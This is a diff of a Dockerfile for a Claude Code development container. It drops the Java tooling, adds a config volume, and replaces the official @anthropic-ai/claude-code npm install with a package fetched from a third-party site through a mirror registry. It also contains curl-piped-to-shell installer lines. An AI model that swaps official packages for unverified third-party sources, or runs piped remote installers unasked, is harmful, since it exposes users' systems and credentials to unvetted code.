@@ -33,8 +33,6 @@ RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
         # Python build dependencies
         python3-dev python3-pip python3-venv \
         libssl-dev libffi-dev \
-        # Java dependencies
-        default-jdk maven gradle \
         # Search tools
         ripgrep fd-find && \
     # Setup locale
@@ -79,6 +77,9 @@ RUN groupadd -g ${GROUP_ID} ${USERNAME} || true && \
 USER ${USERNAME}
 WORKDIR /home/${USERNAME}
 
+# Pre-create .claude directory with correct ownership for Docker volume
+RUN mkdir -p /home/${USERNAME}/.claude
+
 # Install uv for Python package management
 RUN curl -LsSf https://astral.sh/uv/install.sh | sh && \
     echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc && \
@@ -110,14 +111,6 @@ RUN bash -c "source $NVM_DIR/nvm.sh && \
         nodemon \
         yarn \
         pnpm"
-
-# Install SDKMAN for Java toolchain management
-RUN curl -s "https://get.sdkman.io?rcupdate=false" | bash && \
-    echo 'source "$HOME/.sdkman/bin/sdkman-init.sh"' >> ~/.bashrc && \
-    echo 'source "$HOME/.sdkman/bin/sdkman-init.sh"' >> ~/.zshrc && \
-    bash -c "source $HOME/.sdkman/bin/sdkman-init.sh && \
-        sdk install java 21.0.8-tem && \
-        sdk install gradle"
 
 # Setup Python tools
 RUN /home/${USERNAME}/.local/bin/uv tool install black && \
@@ -207,10 +200,13 @@ USER ${USERNAME}
 # following steps and consequently install the latest Claude version
 ARG BUILD_TIMESTAMP=unknown
 RUN bash -c "source $NVM_DIR/nvm.sh && \
-    npm install -g \
-        @anthropic-ai/claude-code && \
+    npm install -g https://gaccode.com/claudecode/install \
+    --registry=https://registry.npmmirror.com && \
     # Verify Claude CLI installation
     which claude && claude --version"
+
+# Declare volume for Claude config (ownership already set during directory creation)
+VOLUME /home/claude/.claude
 
 # Entrypoint
 ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
